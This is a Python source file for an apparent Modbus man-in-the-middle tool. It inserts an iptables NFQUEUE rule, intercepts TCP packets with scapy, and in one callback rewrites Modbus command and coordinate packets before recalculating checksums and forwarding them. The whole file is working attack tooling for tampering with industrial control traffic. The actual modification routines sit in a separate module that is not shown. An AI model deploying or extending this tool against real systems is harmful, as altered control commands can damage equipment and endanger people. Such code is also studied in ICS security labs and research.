from scapy.all import IP, TCP
import threading, os, select
from netfilterqueue import NetfilterQueue
import Modbus as mb

# Handles nfq. Start, stop, callback, modify, etc.



class callbacks:

    def accept_only(pkt):
        pkt.accept()

    def print_and_accept(pkt):
        spkt = IP(pkt.get_payload())
        mb.print_scannable(spkt)
        pkt.accept()

    def print_and_modify(pkt):
        spkt = IP(pkt.get_payload())
        mb.print_scannable(spkt)


        if mb.is_commands(spkt):
            spkt = mb.modify_commands(spkt)
            mb.print_scannable(spkt)

        elif mb.is_coord(spkt):
            spkt = mb.modify_coord(spkt)
            mb.print_scannable(spkt)

        else:
            pkt.accept()
            return

        # Recalculate checksums
        del spkt[TCP].chksum
        del spkt[IP].chksum
        del spkt[IP].len

        pkt.set_payload(bytes(spkt))
        pkt.accept()

# Shared variables
stop_event = None
thread = None
callback = None


def start(_callback = callbacks.accept_only): 
    global stop_event, thread, callback
    callback = _callback
    stop_event = threading.Event()

    thread = threading.Thread(target=_start, daemon=True)
    thread.start()

def _start():
    global stop_event

    # IPTables rule
    os.system("iptables -t mangle -A PREROUTING -i wlp0s20f3 -p TCP -j NFQUEUE --queue-num 1")

    # Create and bind NFQ callback
    nfq = NetfilterQueue()
    nfq.bind(1, callback)

    # Get readable file descriptor
    qfd = nfq.get_fd()
    poller = select.poll()
    poller.register(qfd, select.POLLIN)

    # Pipe for stop signaling
    stop_r, stop_w = os.pipe()
    poller.register(stop_r, select.POLLIN)

    print("[*] NFQUEUE + Modbus MITM running...")

    try:
        while not stop_event.is_set():
            events = poller.poll(500)
            for fd, _ in events:
                if fd == qfd:
                    nfq.run(False)   # process packets without blocking
                elif fd == stop_r:
                    stop_event.set()
    # Stop on error or stop event
    finally:
        nfq.unbind()
        os.close(stop_r)
        os.close(stop_w)
        os.system("iptables -t mangle -D PREROUTING -i wlp0s20f3 -p TCP -j NFQUEUE --queue-num 1")

def stop():
    global stop_event, thread
    if stop_event == None and thread == None:
        print("Net filter queue is not running")
        return
    else:
        print("Stopping net filter queue...")
        stop_event.set()
        thread.join()
        print("Stopped net filter queue")
